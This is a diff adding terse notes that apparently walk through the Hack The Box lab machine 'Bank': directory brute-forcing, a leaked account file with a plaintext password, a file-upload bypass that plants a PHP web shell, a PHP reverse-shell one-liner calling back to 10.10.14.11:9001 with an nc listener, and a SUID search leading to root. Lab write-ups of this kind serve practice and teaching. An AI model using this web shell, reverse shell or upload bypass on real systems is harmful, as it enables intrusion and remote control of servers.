@@ -1,0 +1,17 @@
+/etc/hosts	bank.htb
+dirbuster	//balance-transfer
+http://bank.htb/balance-transfer/68576f20e9732f1b2edc4df5b8533230.acc
+http://bank.htb/balance-transfer/
+//file with lenght 257
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+http://bank.htb/login.php
+http://bank.htb/support.php	//file upload, comment with extension htb to run php code
+	filename="file4.htb"
+	<?php echo system($_REQUEST['cmd']); ?>
+php -r '$sock=fsockopen("10.10.14.11",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
+nc -lvnp 9001	//got user
+
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null	//SUID
+/var/htb/bin/emergency					//got root
